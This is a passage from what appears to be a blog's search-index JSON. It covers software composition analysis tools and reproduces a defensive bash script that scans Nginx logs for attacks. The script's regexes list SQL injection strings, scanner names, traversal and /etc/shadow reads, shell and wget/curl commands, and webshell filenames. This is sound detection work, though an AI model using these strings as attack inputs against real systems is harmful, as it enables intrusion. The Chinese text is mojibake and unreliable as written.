2.ä½¿ç”¨å‘½ä»¤docker-composeÂ upé‡æ–°å¯åŠ¨ä¸€ä¸‹ï¼Œé…ç½®å°±ç”Ÿæ•ˆäº†ï¼Œå¯åŠ¨æ—¶é—´å¯èƒ½ç•¥é•¿ã€‚å‚è€ƒï¼šhttps:&#x2F;&#x2F;docs.dependencytrack.org&#x2F;getting-started&#x2F;database-support&#x2F;\nå¸è½½\ndockerÂ rmiÂ owasp&#x2F;dependency-track\n\ndockerÂ rmÂ dependency-track\n\ndockerÂ volumeÂ rmÂ dependency-track:&#x2F;data\n\t\nOpenSCA[[OpenSCA]]\nå•†ä¸šäº§å“\t\n    \n\n\nCloudDefenseSCA - Software Composition Analysis\nVeraCodeSCA to Automate Security Scanning | Veracode\nSnkySnyk | Developer security | Develop fast. Stay secure.\nSynopsys-blackduckBlack Duck Software Composition Analysis (SCA) | Synopsys\nMendOpen Source Vulnerability Database | Mend\næœ€ä½³å€Ÿé‰´VIVOå¼•å…¥å‰æ£€æµ‹ç¬¬ä¸‰æ–¹ç»„ä»¶åœ¨å¼•å…¥é˜¶æ®µæ—¶ï¼Œvivoåƒé•œå®‰å…¨å®éªŒå®¤ä¼šé‡‡ç”¨é™æ€åˆ†æã€åŠ¨æ€è‡ªåŠ¨åˆ†æå’Œæ‰‹å·¥è°ƒè¯•ç­‰å¤šç§æ–¹å¼ï¼Œå¯¹ç¬¬ä¸‰æ–¹ç»„ä»¶è¿›è¡Œæ·±åº¦çš„å®‰å…¨å’Œéšç§è¯„ä¼°ï¼Œä¿éšœç¬¬ä¸‰æ–¹ç»„ä»¶ä¸ä¼šå­˜åœ¨ä¾µå®³ç”¨æˆ·æƒç›Šçš„è¡Œä¸ºã€‚\nå¼€æºç»„ä»¶åœ¨å¼•å…¥é˜¶æ®µæ—¶ï¼Œvivoåƒé•œå®‰å…¨å®éªŒå®¤é€šè¿‡æ„å»ºå¼€æºç»„ä»¶é£é™©çŸ¥è¯†åº“ï¼Œå°†å¼•å…¥ç»„ä»¶ä¸é£é™©çŸ¥è¯†åº“è¿›è¡ŒåŒ¹é…ï¼Œä»Licenseã€å®‰å…¨ã€åˆè§„ç­‰å¤šç»´åº¦ç”Ÿæˆå¼€æºç»„ä»¶å¼•å…¥æŠ¥å‘Šã€‚\nå¼•å…¥åæ‰«æç”±äºvivoçš„åº”ç”¨ç¨‹åºä¼—å¤šï¼Œå¦‚æœå¯¹æ‰€æœ‰ä»£ç ä»“åŠåˆ†æ”¯è¿›è¡Œäººå·¥å®¡æŸ¥ï¼Œæ— ç–‘ä¼šæ¶ˆè€—å·¨å¤§çš„äººåŠ›ã€‚å› æ­¤ï¼Œvivoåƒé•œå®‰å…¨å®éªŒå®¤å¼€å‘äº†è½¯ä»¶æˆåˆ†åˆ†æå¼•æ“ï¼Œå…¶ä¸­åŒ…å«æ­£å‘æ‰«æä¸é€†å‘æ£€æµ‹ä¸¤ä¸ªå­å¼•æ“ã€‚è½¯ä»¶æˆåˆ†åˆ†æå¼•æ“é€šè¿‡CIé›†æˆè‡ªåŠ¨åŒ–è§¦å‘ä»£ç ä»“æ‰«æï¼Œå®ç°è‡ªåŠ¨åŒ–åˆ†ææ£€æµ‹ã€‚åŒæ—¶ï¼Œé€šè¿‡é£é™©ç®¡æ§æµç¨‹è§¦å‘é£é™©å¤„ç†æµç¨‹ï¼Œå°†æ‰«æç»“æœé€šçŸ¥åˆ°å„è´Ÿè´£äººï¼Œä»è€Œç¡®ä¿ç¬¬ä¸‰æ–¹ç»„ä»¶çš„åº”ç”¨å®‰å…¨å’Œå¼€æºç»„ä»¶çš„ä½¿ç”¨åˆè§„ã€‚\næ­£å‘æ‰«ææ­£å‘æ‰«æå¼•æ“åˆç§°ä¸ºæºç æ‰«æå¼•æ“ï¼Œä¸»è¦é€šè¿‡æ‰«æä»£ç ä»“çš„æ–¹å¼å¯¹å„åº”ç”¨ç¨‹åºè¿›è¡Œè½¯ä»¶æˆåˆ†åˆ†æï¼Œè¿›è€Œæ‰«æå‡ºåº”ç”¨ç¨‹åºæ‰€é›†æˆçš„ç¬¬ä¸‰æ–¹ç»„ä»¶åŠå¼€æºç»„ä»¶ã€‚\nåœ¨è¿›è¡Œæ­£å‘æ‰«æä¹‹å‰ï¼Œéœ€è¦å¯¹åº”ç”¨ç¨‹åºçš„èµ„äº§ä»¥åŠç¬¬ä¸‰æ–¹ç»„ä»¶å’Œå¼€æºç»„ä»¶çš„ç‰¹å¾è¿›è¡Œæ”¶é›†ã€‚åº”ç”¨ç¨‹åºçš„èµ„äº§åŒ…æ‹¬ä»£ç ä»“ã€è´Ÿè´£äººç­‰ä¿¡æ¯ï¼›ç¬¬ä¸‰æ–¹å’Œå¼€æºç»„ä»¶çš„ç‰¹å¾ä¸»è¦åŒ…æ‹¬å¼€å‘å•†ã€è´Ÿè´£äººã€ç‰ˆæœ¬ã€æ–‡ä»¶HASHç­‰ä¿¡æ¯ã€‚\næ­£å‘æ‰«æå¼•æ“åŒ…æ‹¬gradleæ–‡ä»¶æ‰«æã€å·¥ç¨‹æ–‡ä»¶æ‰«æä»¥åŠä»£ç ç‰‡æ®µæ‰«æï¼š\n\nGradleæ–‡ä»¶æ‰«ææŒ‡é€šè¿‡è§£æå·¥ç¨‹ä¸­gradleæ–‡ä»¶ï¼Œè·å–é€šè¿‡gradleå¼•å…¥çš„ç¬¬ä¸‰æ–¹ç»„ä»¶å’Œå¼€æºç»„ä»¶ï¼›\n\nå·¥ç¨‹æ–‡ä»¶æ‰«ææŒ‡é€šè¿‡æ‰«æå·¥ç¨‹ä¸­jaråŒ…æˆ–aaråŒ…ï¼Œè·å–é€šè¿‡æœ¬åœ°é›†æˆå¼•å…¥çš„ç¬¬ä¸‰æ–¹ç»„ä»¶å’Œå¼€æºç»„ä»¶ï¼›\n\nä»£ç ç‰‡æ®µæ‰«ææŒ‡é€šè¿‡æ‰«ææºä»£ç ï¼Œå°†æºä»£ç ä¸­ä»£ç ç‰‡æ®µä¸å¼€æºç»„ä»¶çš„çŸ¥è¯†åº“è¿›è¡Œæ¯”å¯¹ï¼Œè·å–ä»£ç å¼•å…¥çš„å¼€æºç»„ä»¶ã€‚\n\n\nå€¼å¾—ä¸€æçš„æ˜¯ï¼Œæ­£å‘æ‰«æå¼•æ“èƒ½å¤Ÿæ£€æµ‹å‡ºåº”ç”¨ç¨‹åºå¼•å…¥çš„ç¬¬ä¸‰æ–¹ç»„ä»¶å’Œå¼€æºç»„ä»¶çš„ç‰ˆæœ¬ä¿¡æ¯ã€‚å½“ç¬¬ä¸‰æ–¹ç»„ä»¶å’Œå¼€æºç»„ä»¶æŠ«éœ²å‡ºå®‰å…¨æ¼æ´æ—¶ï¼Œèƒ½å¤Ÿé€šè¿‡æ­£å‘æ‰«æå³æ—¶æ£€æµ‹å‡ºå¼•ç”¨é—®é¢˜ç»„ä»¶çš„åº”ç”¨ç¨‹åºä¿¡æ¯ï¼Œä»è€Œæé«˜å®‰å…¨å“åº”æ•ˆç‡ã€‚\t\né€†å‘æ£€æµ‹é€†å‘æ£€æµ‹å¼•æ“ä¸»è¦é€šè¿‡å¯¹åº”ç”¨ç¨‹åºçš„åæ±‡ç¼–è·¯å¾„ä½¿ç”¨ç‰¹å¾æŒ‡çº¹åŒ¹é…çš„æ–¹å¼è¿›è¡Œè½¯ä»¶æˆåˆ†åˆ†æï¼Œè¿›è€Œæ‰«æå‡ºåº”ç”¨ç¨‹åºæ‰€é›†æˆçš„ç¬¬ä¸‰æ–¹ç»„ä»¶åŠå¼€æºç»„ä»¶ã€‚\nåœ¨è¿›è¡Œé€†å‘æ£€æµ‹ä¹‹å‰ï¼Œéœ€è¦å¯¹ç¬¬ä¸‰æ–¹ç»„ä»¶å’Œå¼€æºç»„ä»¶çš„ç‰¹å¾è¿›è¡Œæ”¶é›†ã€‚ç”±äºé€†å‘æ‰«æä¸»è¦å¯¹åº”ç”¨ç¨‹åºçš„åæ±‡ç¼–ä»£ç è¿›è¡Œæ‰«æï¼Œå› æ­¤éœ€è¦å°†åŠ å›ºçš„åº”ç”¨è¿›è¡Œè„±å£³é¢„å¤„ç†ã€‚\né€†å‘æ‰«æå¼•æ“å¯¹APKè¿›è¡Œåæ±‡ç¼–åï¼Œå°†åæ±‡ç¼–çš„ä»£ç ä¸ç»„ä»¶çš„ç‰¹å¾æŒ‡çº¹è¿›è¡ŒåŒ¹é…ï¼Œä»è€Œå¾—åˆ°æ‰«æç»“æœã€‚\t\nReferences\nğŸ‘‘OWASP Top Ten and Software Composition Analysis (SCA)\nSecurity Content Automation Protocol | CSRC\n58å®‰å…¨åº”æ€¥å“åº”ä¸­å¿ƒ|Java ä¾›åº”é“¾(ä¾èµ–)å®‰å…¨æ£€æµ‹å®è·µ\nAPI Products\nAPI Vulnerabilities\nGartner:SCAå¸‚åœºæŒ‡å—Site Unreachable\nè½¯ä»¶æˆåˆ†åˆ†æï¼ˆSCAï¼‰å®Œå…¨æŒ‡å—_å¼€æº_SEALè½¯ä»¶ä¾›åº”é“¾å®‰å…¨_InfoQå†™ä½œç¤¾åŒº\nGitHub - dependabot&#x2F;dependabot-core: ğŸ¤– The core logic behind Dependabotâ€™s update PR creation. For product feedback see: https://github.com/github/feedback/discussions/categories/dependabot-feedback\ndependabot DocsKeeping your dependencies updated automatically with Dependabot version updates - GitHub Docs\nwhat-an-sbom-can-do-for-you\nä¼ä¸šå¼€æºåˆ†æå’Œæ€è€ƒ\næ²¡æœ‰å…è´¹åˆé¤â€”â€”å†æ¢ç§»åŠ¨äº’è”ç½‘è½¯ä»¶ä¾›åº”é“¾å®‰å…¨\n\n","slug":"SCAè½¯ä»¶æˆåˆ†åˆ†æå‰æœŸæ¢ç´¢","date":"2022-06-17T04:52:00.000Z","categories_index":"è½¯ä»¶ä¾›åº”é“¾å®‰å…¨","tags_index":"SCA,è½¯ä»¶ä¾›åº”é“¾å®‰å…¨,SBOM,å¼€æºæ¼æ´åº“,å®‰å…¨","author_index":"Moses"},{"id":"ca8ec5f39f069a5397c4e6f4f192ade4","title":"å¼€æºWAFè°ƒç ”ä¹‹äº§å“é€‰å‹-Nginxä¸´æ—¶åº”æ€¥å·¥å…·","content":"å·¥å…·ä»‹ç»æ­¤è„šæœ¬æ˜¯å‚è€ƒnmgxy&#x2F;klionsecä¿®æ”¹è€Œæ¥,é‡æ–°æ·»åŠ äº†ä¸€äº›ç‰¹å¾ï¼Œåªç”¨æ¥ä¸´æ—¶æ•‘æ€¥ï¼Œè¿˜æ˜¯æ¨èåˆ°ELKæˆ–è€…Splunkä¸­åˆ†æğŸ©é¡¹ç›®åœ°å€GitHub - al0ne&#x2F;nginx_log_check: Nginxæ—¥å¿—å®‰å…¨åˆ†æè„šæœ¬\nåŠŸèƒ½\nç»Ÿè®¡Top 20 åœ°å€\nSQLæ³¨å…¥åˆ†æ\nSQLæ³¨å…¥ FROMæŸ¥è¯¢ç»Ÿè®¡\næ‰«æå™¨&#x2F;å¸¸ç”¨é»‘å®¢å·¥å…·\næ¼æ´åˆ©ç”¨æ£€æµ‹\næ•æ„Ÿè·¯å¾„è®¿é—®\næ–‡ä»¶åŒ…å«æ”»å‡»\nHTTP Tunnel\nWebshell\nå¯»æ‰¾å“åº”é•¿åº¦çš„url Top 20\nå¯»æ‰¾ç½•è§çš„è„šæœ¬æ–‡ä»¶è®¿é—®\nå¯»æ‰¾302è·³è½¬çš„è„šæœ¬æ–‡ä»¶\n\nè„šæœ¬#!&#x2F;usr&#x2F;bin&#x2F;env bash\n\necho &quot;&quot;\necho &quot; &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; &quot;\necho &quot; \\                 Nginxæ—¥å¿—å®‰å…¨åˆ†æè„šæœ¬ V1.0            &#x2F; &quot;\necho &quot; &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; &quot;\necho &quot; # æ”¯æŒNginxæ—¥å¿—åˆ†æï¼Œæ”»å‡»å‘Šè­¦åˆ†æç­‰                    &quot;\necho &quot; # authorï¼šal0ne                    &quot;\necho &quot; # https:&#x2F;&#x2F;github.com&#x2F;al0ne                    &quot;\necho -e &quot;\\n&quot;\n\n#å¦‚æœå­˜åœ¨å¤šä¸ªaccessæ–‡ä»¶æˆ–è€…æœ‰å¤šä¸ªaccess.x.gz å»ºè®®å…ˆzcat access*.gz &gt;&gt;access.logæ–‡ä»¶ä¸­\n#è®¾ç½®åˆ†æç»“æœå­˜å‚¨ç›®å½•,ç»“å°¾ä¸èƒ½åŠ &#x2F;\noutfile&#x3D;&#x2F;tmp&#x2F;logs\n#å¦‚æœç›®å½•ä»¥å­˜åœ¨åˆ™æ¸…ç©ºï¼Œæœªå­˜åœ¨åˆ™æ–°å»ºç›®å½•\nif [ -d $outfile ]; then\n    rm -rf $outfile&#x2F;*\nelse\n    mkdir -p $outfile\nfi\n#è®¾ç½®nginxæ—¥å¿—ç›®å½•ï¼Œç»“å°¾å¿…é¡»åŠ &#x2F;\naccess_dir&#x3D;&#x2F;var&#x2F;log&#x2F;nginx&#x2F;\n#è®¾ç½®æ–‡ä»¶åï¼Œå¦‚æœæ–‡ä»¶åä¸ºaccessé‚£ä¹ˆåŒ¹é…çš„æ˜¯access*æ–‡ä»¶\naccess_log&#x3D;access\n#åˆ¤æ–­æ—¥å¿—æ–‡ä»¶æ˜¯å¦å­˜åœ¨\nnum&#x3D;$(ls $&#123;access_dir&#125;$&#123;access_log&#125;* | wc -l) &gt;&#x2F;dev&#x2F;null 2&gt;&amp;1\nif [ $num -eq 0 ]; then\n    echo &#39;æ—¥å¿—æ–‡ä»¶ä¸å­˜åœ¨&#39;\n    exit 1\nfi\necho -e &quot;\\n&quot;\n\n# éªŒè¯æ“ä½œç³»ç»Ÿæ˜¯debianç³»è¿˜æ˜¯centos\nOS&#x3D;&#39;None&#39;\nif [ -e &quot;&#x2F;etc&#x2F;os-release&quot; ]; then\n    source &#x2F;etc&#x2F;os-release\n    case $&#123;ID&#125; in\n    &quot;debian&quot; | &quot;ubuntu&quot; | &quot;devuan&quot;)\n        OS&#x3D;&#39;Debian&#39;\n        ;;\n    &quot;centos&quot; | &quot;rhel fedora&quot; | &quot;rhel&quot;)\n        OS&#x3D;&#39;Centos&#39;\n        ;;\n    *) ;;\n    esac\nfi\n\nif [ $OS &#x3D; &#39;None&#39; ]; then\n    if command -v apt-get &gt;&#x2F;dev&#x2F;null 2&gt;&amp;1; then\n        OS&#x3D;&#39;Debian&#39;\n    elif command -v yum &gt;&#x2F;dev&#x2F;null 2&gt;&amp;1; then\n        OS&#x3D;&#39;Centos&#39;\n    else\n        echo -e &quot;\\nä¸æ”¯æŒè¿™ä¸ªç³»ç»Ÿ\\n&quot;\n        echo -e &quot;å·²é€€å‡º&quot;\n        exit 1\n    fi\nfi\n\n# æ£€æµ‹agè½¯ä»¶æœ‰æ²¡æœ‰å®‰è£…\nif ag -V &gt;&#x2F;dev&#x2F;null 2&gt;&amp;1; then\n    echo -e &quot;\\e[00;32msilversearcher-agå·²å®‰è£… \\e[00m&quot;\nelse\n    if [ $OS &#x3D; &#39;Centos&#39; ]; then\n        yum -y install the_silver_searcher &gt;&#x2F;dev&#x2F;null 2&gt;&amp;1\n    else\n        apt-get -y install silversearcher-ag &gt;&#x2F;dev&#x2F;null 2&gt;&amp;1\n    fi\n\nfi\n#å¦‚æœæ£€æµ‹åˆ«çš„æ—¥å¿—è¯·æ‰‹åŠ¨æ›¿æ¢åç§»ï¼Œä¾‹å¦‚awkçš„$7ä»£è¡¨urlï¼Œ$9ä»£è¡¨çŠ¶æ€ç ï¼Œ$10ä»£è¡¨é•¿åº¦,æœ¬è„šæœ¬æ˜¯ä»¥nginxæ—¥å¿—ä¸ºåŸºç¡€\n\necho &quot;åˆ†æç»“æœæ—¥å¿—ï¼š$&#123;outfile&#125;&quot;\necho &quot;Nginxæ—¥å¿—ç›®å½•ï¼š$&#123;access_dir&#125;&quot;\necho &quot;Nginxæ–‡ä»¶åï¼š$&#123;access_log&#125;&quot;\necho -e &quot;\\n&quot;\n\necho -e &quot;\\e[00;31m[+]TOP 20 IP åœ°å€\\e[00m&quot;\nag -a -o --nofilename &#39;\\d+\\.\\d+\\.\\d+\\.\\d+&#39; $&#123;access_dir&#125;$&#123;access_log&#125;* | sort | uniq -c | sort -nr | head -n 20 | tee -a $&#123;outfile&#125;&#x2F;top20.log\necho -e &quot;\\n&quot;\n\necho -e &quot;\\e[00;31m[+]SQLæ³¨å…¥æ”»å‡»åˆ†æ\\e[00m&quot;\n#åœ¨SQLæ³¨å…¥ä¸­æ’é™¤æ‰äº†ä¸€äº›æ‰«æcss&#x2F;js&#x2F;pngå›¾ç‰‡ç±»ç­‰æ— ç”¨å‘Šè­¦ï¼Œå¹¶ä¸”é‡ç‚¹ç­›é€‰çŠ¶æ€ç 200æˆ–è€…500çš„å‘Šè­¦\nag -a &quot;xp_cmdshell|%20xor|%20and|%20AND|%20or|%20OR|select%20|%20and%201&#x3D;1|%20and%201&#x3D;2|%20from|%27exec|information_schema.tables|load_file|benchmark|substring|table_name|table_schema|%20where%20|%20union%20|%20UNION%20|concat\\(|concat_ws\\(|%20group%20|0x5f|0x7e|0x7c|0x27|%20limit|\\bcurrent_user\\b|%20LIMIT|version%28|version\\(|database%28|database\\(|user%28|user\\(|%20extractvalue|%updatexml|rand\\(0\\)\\*2|%20group%20by%20x|%20NULL%2C|sqlmap&quot; $&#123;access_dir&#125;$&#123;access_log&#125;* | ag -v &#39;&#x2F;\\w+\\.(?:js|css|html|jpg|jpeg|png|htm|swf)(?:\\?| )&#39; | awk &#39;($9&#x3D;&#x3D;200)||($9&#x3D;&#x3D;500) &#123;print $0&#125;&#39; &gt;$&#123;outfile&#125;&#x2F;sql.log\nawk &#39;&#123;print &quot;SQLæ³¨å…¥æ”»å‡»&quot; NR&quot;æ¬¡&quot;&#125;&#39; $&#123;outfile&#125;&#x2F;sql.log | tail -n1\necho &quot;SQLæ³¨å…¥ TOP 20 IPåœ°å€&quot;\nag -o &#39;(?&lt;&#x3D;:)\\d+\\.\\d+\\.\\d+\\.\\d+&#39; $&#123;outfile&#125;&#x2F;sql.log | sort | uniq -c | sort -nr | head -n 20 | tee -a $&#123;outfile&#125;&#x2F;sql_top20.log\n# é‡ç‚¹å…³æ³¨fromæŸ¥è¯¢ï¼Œæ˜¯å¦å­˜åœ¨è„±è£¤è¡Œä¸ºï¼Œæ’é™¤æ‰«æè¡Œä¸º\necho &quot;SQLæ³¨å…¥ FROM æŸ¥è¯¢&quot;\ncat $&#123;outfile&#125;&#x2F;sql.log | ag &#39;\\bfrom\\b&#39; | ag -v &#39;information_schema&#39; &gt;$&#123;outfile&#125;&#x2F;sql_from_query.log\nawk &#39;&#123;print &quot;SQLæ³¨å…¥FROMæŸ¥è¯¢&quot; NR&quot;æ¬¡&quot;&#125;&#39; $&#123;outfile&#125;&#x2F;sql_from_query.log | tail -n1\necho -e &quot;\\n&quot;\n\necho -e &quot;\\e[00;31m[+]æ‰«æå™¨scan &amp; é»‘å®¢å·¥å…·\\e[00m&quot;\nag -a &quot;acunetix|by_wvs|nikto|netsparker|HP404|nsfocus|WebCruiser|owasp|nmap|nessus|HEAD &#x2F;|AppScan|burpsuite|w3af|ZAP|openVAS|.+avij|.+angolin|360webscan|webscan|XSS@HERE|XSS%40HERE|NOSEC.JSky|wwwscan|wscan|antSword|WebVulnScan|WebInspect|ltx71|masscan|python-requests|Python-urllib|WinHttpRequest&quot; $&#123;access_dir&#125;$&#123;access_log&#125;* | ag -v &#39;&#x2F;\\w+\\.(?:js|css|jpg|jpeg|png|swf)(?:\\?| )&#39; | awk &#39;($9&#x3D;&#x3D;200)||($9&#x3D;&#x3D;500) &#123;print $0&#125;&#39; &gt;$&#123;outfile&#125;&#x2F;scan.log\nawk &#39;&#123;print &quot;å…±æ£€æµ‹åˆ°æ‰«ææ”»å‡»&quot; NR&quot;æ¬¡&quot;&#125;&#39; $&#123;outfile&#125;&#x2F;scan.log | tail -n1\necho &quot;æ‰«æå·¥å…·æµé‡ TOP 20&quot;\nag -o &#39;(?&lt;&#x3D;:)\\d+\\.\\d+\\.\\d+\\.\\d+&#39; $&#123;outfile&#125;&#x2F;scan.log | sort | uniq -c | sort -nr | head -n 20 | tee -a $&#123;outfile&#125;&#x2F;scan_top20.log\necho -e &quot;\\n&quot;\n\necho -e &quot;\\e[00;31m[+]æ•æ„Ÿè·¯å¾„è®¿é—®\\e[00m&quot;\nag -a &quot;&#x2F;_cat&#x2F;|&#x2F;_config&#x2F;|include&#x3D;|phpinfo|info\\.php|&#x2F;web-console|JMXInvokerServlet|&#x2F;manager&#x2F;html|axis2-admin|axis2-web|phpMyAdmin|phpmyadmin|&#x2F;admin-console|&#x2F;jmx-console|&#x2F;console&#x2F;|\\.tar.gz|\\.tar|\\.tar.xz|\\.xz|\\.zip|\\.rar|\\.mdb|\\.inc|\\.sql|&#x2F;\\.config\\b|\\.bak|&#x2F;.svn&#x2F;|&#x2F;\\.git&#x2F;|\\.hg|\\.DS_Store|\\.htaccess|nginx\\.conf|\\.bash_history|&#x2F;CVS&#x2F;|\\.bak|wwwroot|å¤‡ä»½|&#x2F;Web.config|&#x2F;web.config|&#x2F;1.txt|&#x2F;test.txt&quot; $&#123;access_dir&#125;$&#123;access_log&#125;* | awk &#39;($9&#x3D;&#x3D;200)||($9&#x3D;&#x3D;500) &#123;print $0&#125;&#39; &gt;$&#123;outfile&#125;&#x2F;dir.log\nawk &#39;&#123;print &quot;å…±æ£€æµ‹åˆ°é’ˆå¯¹æ•æ„Ÿæ–‡ä»¶æ‰«æ&quot; NR&quot;æ¬¡&quot;&#125;&#39; $&#123;outfile&#125;&#x2F;dir.log | tail -n1\necho &quot;æ•æ„Ÿæ–‡ä»¶è®¿é—®æµé‡ TOP 20&quot;\nag -o &#39;(?&lt;&#x3D;:)\\d+\\.\\d+\\.\\d+\\.\\d+&#39; $&#123;outfile&#125;&#x2F;dir.log | sort | uniq -c | sort -nr | head -n 20 | tee -a $&#123;outfile&#125;&#x2F;dir_top20.log\necho -e &quot;\\n&quot;\n\necho -e &quot;\\e[00;31m[+]æ¼æ´åˆ©ç”¨æ£€æµ‹\\e[00m&quot;\nag -a &quot;%00|&#x2F;win.ini|&#x2F;my.ini|\\.\\.&#x2F;\\.\\.&#x2F;|&#x2F;etc&#x2F;shadow|%0D%0A|file:&#x2F;|gopher:&#x2F;|dict:&#x2F;|WindowsPowerShell|&#x2F;wls-wsat&#x2F;|call_user_func_array|uddiexplorer|@DEFAULT_MEMBER_ACCESS|@java\\.lang\\.Runtime|OgnlContext|&#x2F;bin&#x2F;bash|cmd\\.exe|wget\\s|curl\\s|s&#x3D;&#x2F;index&#x2F;\\think&quot; $&#123;access_dir&#125;$&#123;access_log&#125;* | awk &#39;($9&#x3D;&#x3D;200)||($9&#x3D;&#x3D;500) &#123;print $0&#125;&#39; &gt;$&#123;outfile&#125;&#x2F;exploit.log\nawk &#39;&#123;print &quot;æ¼æ´åˆ©ç”¨æ¢æµ‹&quot; NR&quot;æ¬¡&quot;&#125;&#39; $&#123;outfile&#125;&#x2F;exploit.log | tail -n1\necho &quot;æ¼æ´åˆ©ç”¨æ£€æµ‹ TOP 20&quot;\nag -o &#39;(?&lt;&#x3D;:)\\d+\\.\\d+\\.\\d+\\.\\d+&#39; $&#123;outfile&#125;&#x2F;exploit.log | sort | uniq -c | sort -nr | head -n 20 | tee -a $&#123;outfile&#125;&#x2F;exploit_top20.log\necho -e &quot;\\n&quot;\n\necho -e &quot;\\e[00;31m[+]webshell\\e[00m&quot;\nag -a &quot;&#x3D;whoami|dbname&#x3D;|exec&#x3D;|cmd&#x3D;|\\br57\\b|\\bc99\\b|\\bc100\\b|\\bb374k\\b|adminer.php|eval\\(|assert\\(|%eval|%execute|tunnel\\.[asp|php|jsp|aspx]&#123;3,4&#125;|makewebtaski|ma\\.[asp|php|jsp|aspx]&#123;3,4&#125;|\\bup\\.[asp|php|jsp|aspx]&#123;3,4&#125;|cmd\\.[asp|php|jsp|aspx]&#123;3,4&#125;|201\\d\\.[asp|php|jsp|aspx]&#123;3,4&#125;|xiaoma\\.[asp|php|jsp|aspx]&#123;3,4&#125;|shell\\.[asp|php|jsp|aspx]&#123;3,4&#125;|404\\.[asp|php|jsp|aspx]&#123;3,4&#125;|tom\\.[asp|php|jsp|aspx]&#123;3,4&#125;|k8cmd\\.[asp|php|jsp|aspx]&#123;3,4&#125;|ver[0-9]&#123;3,4&#125;\\.[asp|php|jsp|aspx]&#123;3,4&#125;|\\.aar|[asp|php|jsp|aspx]&#123;3,4&#125;spy\\.|o&#x3D;vLogin|aioshell|admine|ghost\\.[asp|php|jsp|aspx]&#123;3,4&#125;|r00ts|90sec|t00ls|editor\\.aspx|wso\\.[asp|aspx]&#123;3,4&#125;&quot; $&#123;access_dir&#125;$&#123;access_log&#125;* | awk &#39;($9&#x3D;&#x3D;200)||($9&#x3D;&#x3D;500) &#123;print $0&#125;&#39; &gt;$&#123;outfile&#125;&#x2F;webshell.log\nawk &#39;&#123;print &quot;å…±æ£€æµ‹åˆ°webshellè¡Œä¸º&quot; NR &quot;æ¬¡&quot;&#125;&#39; $&#123;outfile&#125;&#x2F;webshell.log | tail -n1\necho &quot;Webshell TOP 20&quot;\nag -o &#39;(?&lt;&#x3D;:)\\d+\\.\\d+\\.\\d+\\.\\d+&#39; $&#123;outfile&#125;&#x2F;webshell.log | sort | uniq -c | sort -nr | head -n 20 | tee -a $&#123;outfile&#125;&#x2F;webshell_top20.log\necho -e &quot;\\n&quot;\n\necho -e &quot;\\e[00;31m[+]HTTP Tunnel\\e[00m&quot;\n#Regeorgä»£ç†ç‰¹å¾\nag -a &quot;cmd&#x3D;disconnect|cmd&#x3D;read|cmd&#x3D;forward|cmd&#x3D;connect|127.0.0.1&quot; $&#123;access_dir&#125;$&#123;access_log&#125;* | awk &#39;($9&#x3D;&#x3D;200)||($9&#x3D;&#x3D;500) &#123;print $0&#125;&#39; | tee -a $&#123;outfile&#125;&#x2F;tunnel.log\nawk &#39;&#123;print &quot;å…±æ£€æµ‹åˆ°éš§é“è¡Œä¸º&quot; NR &quot;æ¬¡&quot;&#125;&#39; $&#123;outfile&#125;&#x2F;tunnel.log | tail -n1\necho -e &quot;\\n&quot;\n\necho -e &quot;\\e[00;31m[+]Top 20 urlå“åº”é•¿åº¦\\e[00m&quot;\n# æŸ¥æ‰¾urlå“åº”é•¿åº¦æœ€é•¿çš„urlæ’åºï¼Œç›®çš„æ˜¯æœ‰æ²¡æœ‰ä¸‹è½½æœåŠ¡å™¨çš„ä¸€äº›æ‰“åŒ…æ–‡ä»¶\nlen&#x3D;$(cat $&#123;access_dir&#125;$&#123;access_log&#125;* | awk &#39;&#123;print $10&#125;&#39; | sort -nr | head -n 20)\necho $len | awk &#39;BEGIN&#123; RS&#x3D;&quot; &quot; &#125;&#123; print $0 &#125;&#39; | xargs -i&#123;&#125; ag -a --nocolor &#39;\\d+\\s&#123;&#125;\\s&#39; $&#123;access_dir&#125;$&#123;access_log&#125;* | awk &#39;&#123;print $7,$10&#125;&#39; | sort | uniq | sort -k 2 -nr | tee -a $&#123;outfile&#125;&#x2F;url_rsp_len.log\necho -e &quot;\\n&quot;\n\necho -e &quot;\\e[00;31m[+]ç½•è§çš„è„šæœ¬æ–‡ä»¶è®¿é—®\\e[00m&quot;\necho &quot;è®¿é—®é‡ç‰¹åˆ«ç‰¹åˆ«å°‘çš„è„šæœ¬æ–‡ä»¶ææœ‰å¯èƒ½æ˜¯webshell&quot;\ncat $&#123;access_dir&#125;$&#123;access_log&#125;* | awk &#39;($9&#x3D;&#x3D;200)||($9&#x3D;&#x3D;500) &#123;print $7&#125;&#39; | sort | uniq -c | sort -n | ag -v &#39;\\?&#39; | ag &#39;\\.php|\\.jsp|\\.asp|\\.aspx&#39; | head -n 20 | tee -a $&#123;outfile&#125;&#x2F;rare_url.log\necho -e &quot;\\n&quot;\n\necho -e &quot;\\e[00;31m[+]302è·³è½¬\\e[00m&quot;\necho &quot;æ­¤ç›®çš„æ˜¯å¯»æ‰¾ä¸€äº›ç™»å½•æˆåŠŸçš„è„šæœ¬æ–‡ä»¶&quot;\ncat $&#123;access_dir&#125;$&#123;access_log&#125;* | awk &#39;($9&#x3D;&#x3D;302)||($9&#x3D;&#x3D;301) &#123;print $7&#125;&#39; | sort | uniq -c | sort -n | ag -v &#39;\\?&#39; | ag 